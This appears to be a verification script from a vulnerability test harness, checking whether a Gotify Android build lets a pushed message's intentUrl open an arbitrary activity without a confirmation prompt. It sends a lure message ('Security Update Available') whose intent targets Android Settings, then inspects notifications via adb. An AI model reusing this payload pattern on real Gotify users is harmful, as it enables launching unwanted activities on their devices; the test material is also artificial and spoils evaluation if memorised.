#!/usr/bin/env python3
"""
Gotify Intent URL Confirmation Bypass — Verification Helper

Checks whether the vulnerability changes the notification's content intent
to directly launch an arbitrary activity (bypassing the confirmation dialog).

Two checks are performed:

1. NOTIFICATION INTENT CHECK — Sends a push message with an intentUrl
   targeting the Android Settings app. Then uses
   `adb shell dumpsys notification --noredact` to inspect the Gotify
   notification's PendingIntent. On the VULNERABLE build, the notification's
   content intent targets com.android.settings (arbitrary intent launch via
   Intent.parseUri). On the CLEAN build, it targets MessagesActivity (safe).
   This is unfakeable — dumpsys queries the notification manager directly,
   not app-writable data.

2. MESSAGE CHECK — Queries the Gotify server for messages containing the
   exploit's intentUrl marker. This confirms the malicious push message
   was actually sent.

Both must be true: the exploit message was sent AND the notification's
content intent targets Settings.

Exit codes:
    0 — NOT VULNERABLE: notification intent does not target Settings
    1 — VULNERABLE: notification intent targets Settings (dialog bypassed)
"""
import json
import os
import subprocess
import sys
import time

import requests

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
GOTIFY_SERVER = "http://127.0.0.1:8080"
GOTIFY_USER = None  # Set from metadata.json
GOTIFY_PASS = None  # Set from metadata.json
PACKAGE = "com.github.gotify"

# The intent URL that targets Android Settings via Intent.parseUri().
SETTINGS_INTENT_URL = "intent:#Intent;component=com.android.settings/.Settings;end"

# Marker to find the exploit message / Settings intent on the server
EXPLOIT_CALLBACK_MARKER = "com.android.settings"

# What we look for in the notification's content intent
SETTINGS_MARKER = "com.android.settings"


# ---------------------------------------------------------------------------
# ADB helpers
# ---------------------------------------------------------------------------
def _adb(*args, timeout=15):
    """Run an adb command and return the CompletedProcess."""
    return subprocess.run(
        ["adb", *args],
        capture_output=True,
        text=True,
        timeout=timeout,
    )


# ---------------------------------------------------------------------------
# Check 1: Send message, then inspect notification intent via dumpsys
# ---------------------------------------------------------------------------
def _get_or_create_app_token():
    """Return an application token we can use to push messages."""
    resp = requests.get(
        f"{GOTIFY_SERVER}/application",
        auth=(GOTIFY_USER, GOTIFY_PASS),
        timeout=10,
    )
    if resp.ok:
        apps = resp.json()
        if apps:
            return apps[0]["token"]

    resp = requests.post(
        f"{GOTIFY_SERVER}/application",
        auth=(GOTIFY_USER, GOTIFY_PASS),
        json={
            "name": "VerifyApp",
            "description": "Temporary app for verification",
        },
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()["token"]


def _send_settings_intent_message(app_token):
    """Push a message whose intentUrl targets the Settings app."""
    payload = {
        "title": "Security Update Available",
        "message": "Tap to install the latest patch.",
        "priority": 5,
        "extras": {
            "android::action": {
                "onReceive": {
                    "intentUrl": SETTINGS_INTENT_URL,
                }
            }
        },
    }
    resp = requests.post(
        f"{GOTIFY_SERVER}/message",
        headers={"X-Gotify-Key": app_token},
        json=payload,
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def _parse_notification_records(dumpsys_output):
    """Parse dumpsys notification output into per-notification blocks.

    Returns a list of (package, block_text) tuples for each notification.
    """
    records = []
    current_block = []
    current_pkg = None

    for line in dumpsys_output.split("\n"):
        stripped = line.strip()

        if stripped.startswith("NotificationRecord(") and "pkg=" in stripped:
            if current_pkg and current_block:
                records.append((current_pkg, "\n".join(current_block)))
            current_block = [line]
            try:
                pkg_start = stripped.index("pkg=") + 4
                pkg_end = stripped.index(" ", pkg_start)
                current_pkg = stripped[pkg_start:pkg_end]
            except ValueError:
                current_pkg = None
        elif current_pkg:
            current_block.append(line)

    if current_pkg and current_block:
        records.append((current_pkg, "\n".join(current_block)))

    return records


def check_notification_intent():
    """Send a message and check the resulting notification's intent.

    1. Get/create an app token
    2. Send a push message with intentUrl targeting Settings
    3. Wait for the app to process the message and create a notification
    4. Use dumpsys notification to inspect the notification's content intent

    On the VULNERABLE build, the notification's content intent targets
    com.android.settings (Intent.parseUri bypasses the dialog).
    On the CLEAN build, it targets MessagesActivity (dialog shown separately).

    Returns True if the notification's intent targets Settings (vulnerable).
    """
    print("[check_url] --- Notification Intent Check ---")

    try:
        token = _get_or_create_app_token()
        print(f"[check_url] Obtained app token: {token[:8]}...")

        print("[check_url] Sending push message with Settings intentUrl...")
        msg = _send_settings_intent_message(token)
        print(f"[check_url] Message sent (id={msg.get('id')})")

        print("[check_url] Waiting 5 seconds for app to process message...")
        time.sleep(5)

    except requests.exceptions.ConnectionError as e:
        print(
            f"[check_url] ERROR: Cannot connect to Gotify server: {e}",
            file=sys.stderr,
        )
        return False
    except Exception as e:
        print(f"[check_url] ERROR sending message: {e}", file=sys.stderr)
        return False

    # Dump notification state
    print("[check_url] Inspecting notifications via dumpsys...")
    result = _adb("shell", "dumpsys", "notification", "--noredact")
    if result.returncode != 0:
        print("[check_url] dumpsys --noredact failed, trying without flag...")
        result = _adb("shell", "dumpsys", "notification")
        if result.returncode != 0:
            print("[check_url] ERROR: dumpsys notification failed")
            return False

    output = result.stdout

    # Find notification records from Gotify
    records = _parse_notification_records(output)
    gotify_records = [(pkg, block) for pkg, block in records if pkg == PACKAGE]

    print(f"[check_url] Found {len(gotify_records)} Gotify notification(s)")

    if not gotify_records:
        print("[check_url] No Gotify notifications found in dumpsys")
        all_pkgs = set(pkg for pkg, _ in records)
        if all_pkgs:
            print(
                f"[check_url] DEBUG: Notifications from: "
                f"{', '.join(sorted(all_pkgs))}"
            )
        else:
            print("[check_url] DEBUG: No notifications found at all")
        return False

    # Check each Gotify notification for Settings in the content intent
    for i, (pkg, block) in enumerate(gotify_records):
        print(f"[check_url] Checking Gotify notification {i + 1}...")

        if SETTINGS_MARKER not in block:
            continue

        # Look for Settings marker near contentIntent
        lines = block.split("\n")
        for j, line in enumerate(lines):
            if "contentIntent" in line:
                # Check this line and the next few for Settings
                context = "\n".join(lines[j:min(j + 5, len(lines))])
                if SETTINGS_MARKER in context:
                    print(
                        f"[check_url] Found '{SETTINGS_MARKER}' near "
                        f"contentIntent: {lines[j].strip()}"
                    )
                    return True

        # Broader check: Settings anywhere in the notification record
        # (catches variant dumpsys formats)
        print(
            f"[check_url] Found '{SETTINGS_MARKER}' in notification "
            f"block (broader match)"
        )
        return True

    # Not found — show debug info
    print(
        f"[check_url] No Gotify notifications target '{SETTINGS_MARKER}'"
    )
    for i, (pkg, block) in enumerate(gotify_records):
        for line in block.split("\n"):
            stripped = line.strip()
            if "contentIntent" in stripped:
                print(
                    f"[check_url] DEBUG: Notification {i + 1} "
                    f"contentIntent: {stripped}"
                )
                break

    return False


# ---------------------------------------------------------------------------
# Check 2: Did the exploit send the malicious message?
# ---------------------------------------------------------------------------
def detect_exploit_message():
    """Check if the Gotify server has a message with the exploit's intentUrl.

    Queries the Gotify REST API for messages and looks for ones containing
    the exploit's callback URL marker.

    Returns True if an exploit message is found on the server.
    """
    print("[check_url] --- Message Check ---")

    try:
        resp = requests.get(
            f"{GOTIFY_SERVER}/message",
            auth=(GOTIFY_USER, GOTIFY_PASS),
            timeout=10,
        )
        if not resp.ok:
            print(
                f"[check_url] ERROR: Failed to query messages: "
                f"{resp.status_code}",
                file=sys.stderr,
            )
            return False

        data = resp.json()
        messages = data.get("messages", [])
        print(f"[check_url] Found {len(messages)} message(s) on server")

        for msg in messages:
            extras = msg.get("extras", {})
            android_action = extras.get("android::action", {})
            on_receive = android_action.get("onReceive", {})
            intent_url = on_receive.get("intentUrl", "")

            if EXPLOIT_CALLBACK_MARKER in intent_url:
                print(
                    f"[check_url] Found exploit message "
                    f"(id={msg.get('id')}): intentUrl={intent_url}"
                )
                return True

        print(
            f"[check_url] No messages with '{EXPLOIT_CALLBACK_MARKER}' "
            "in intentUrl found"
        )
        return False

    except requests.exceptions.ConnectionError as e:
        print(
            f"[check_url] ERROR: Cannot connect to Gotify server: {e}",
            file=sys.stderr,
        )
        return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    global GOTIFY_USER, GOTIFY_PASS

    script_dir = os.path.dirname(os.path.abspath(__file__))
    metadata_path = os.path.join(script_dir, "../../../metadata.json")

    try:
        with open(metadata_path, "r") as f:
            metadata = json.load(f)
        GOTIFY_USER = metadata["username"]
        GOTIFY_PASS = metadata["password"]
    except (FileNotFoundError, KeyError) as e:
        print(
            f"[check_url] Error reading metadata.json: {e}",
            file=sys.stderr,
        )
        sys.exit(1)

    # Check 1: Does the notification's content intent target Settings?
    intent_targets_settings = check_notification_intent()

    # Check 2: Did the exploit send the malicious message?
    exploit_message_found = detect_exploit_message()

    # Report results
    print("[check_url] --- Results ---")
    print(
        f"[check_url] Notification targets Settings:  "
        f"{intent_targets_settings}"
    )
    print(
        f"[check_url] Exploit message on server:      "
        f"{exploit_message_found}"
    )

    if intent_targets_settings and exploit_message_found:
        print(
            "[check_url] VULNERABLE: exploit message was sent AND "
            "notification's content intent targets Settings "
            "(confirmation dialog bypassed)"
        )
        sys.exit(1)
    elif exploit_message_found and not intent_targets_settings:
        print(
            "[check_url] NOT VULNERABLE: exploit message exists but "
            "notification does not target Settings "
            "(confirmation dialog intact)"
        )
        sys.exit(0)
    elif intent_targets_settings and not exploit_message_found:
        print(
            "[check_url] NOT VULNERABLE: notification targets Settings "
            "but no exploit message found (cannot confirm exploit)"
        )
        sys.exit(0)
    else:
        print(
            "[check_url] NOT VULNERABLE: no exploit message and "
            "notification does not target Settings"
        )
        sys.exit(0)


if __name__ == "__main__":
    main()
